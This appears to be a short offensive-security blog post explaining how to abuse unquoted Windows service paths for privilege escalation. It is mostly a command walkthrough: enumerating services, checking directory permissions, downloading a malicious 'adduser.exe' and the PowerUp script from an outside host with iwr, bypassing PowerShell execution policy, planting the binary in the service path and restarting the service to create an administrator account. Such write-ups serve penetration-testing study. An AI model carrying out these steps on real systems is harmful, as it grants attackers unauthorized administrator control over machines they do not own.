---
layout: post
title: Windows Unquoted Paths
titledate: 09/16/23
tags: ["infosec","offsec", "privesc", "powershell", "exploit", "dll", "powerup"]
---

#### unquoted binary path abuse

when windows encounters an unquoted path to a binary application it follows a specific order of execution

- C:\Program.exe
- C:\Program Files\My.exe
- C:\Program Files\My Program\My.exe
- C:\Program Files\My Program\My service\service.exe

looking at the example above, for the binary service.exe it trys to execute the first word encountered by appending .exe to it assuming that we meant to call that the executable

for the first few directories we encounter that are Windows managed by default usually locked down pretty tight with permissions we can not do much (i.e Program.exe will likely not be a viable exploit option for us), however, as we continue down the path to directories and software that the user has created we will have more options. In the case above the My Service directory can be exploited by adding the My binary to the My Program files

if we want to enumerate running and stopped processes

    PS > Get-CimInstance -ClassName win32_service | Select Name,State,PathName

now we can enter a command to get us all binaries with their respective paths that are located outside the Windows directory

### C:> wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """

as always when working with services, to determine if our current user has the permissions required to execute the service, we begin by trying to start the service

    PS > Start-Service myservice
    PS > Stop-Service myservice

now we can uses icalcs to check the permissions of the service binary directories

    PS > icacls "C:\Program Files\Enterprise Apps" (...\Current Version\nyservice.exe)

in this example we have write permissions available to the current user for the Enterprise Apps directory

so we can copy our malicious executable over - and lable it Current.exe as the next path it is looking for is Curent Version

    PS > iwr -uri http://192.168.1.1/adduser.exe -Outfile Current.exe
    PS > copy .\Current.exe 'C:\Program Files\Enterprise Apps\Current.exe'

now start the service to execute our code

    PS > Start-Service myservice

we may get a powershell error , but that does not necessarily mean our code did not execute before the script errored out

#### PowerUp automation

we can achieve similar results with the PowerUp powershell script

    PS > iwr http://192.168.1.1/PowerUp.ps1 -Outfile PowerUp.ps1

we copy the script over and allow the execution bypass

    PS > powershell -ep bypass

start the script

    PS > . .\PowerUp.ps1

execute the unquoted service option

    PS > Get-UnquotedService

and then check if we have the abuse function and point it to the path binary we are creating, by default this creates the john admin user, however we can modify to change the password of a current admin acount if we wish or any other sys level command

    PS > Write-ServiceBinary -Name 'myservice' -Path "C:\Program Files\Enterprise Apps\Current.exe"

to execute our code we need to restart the service

    PS > Restart-Service myservice

and again even if the script errors we may have achieved our code execution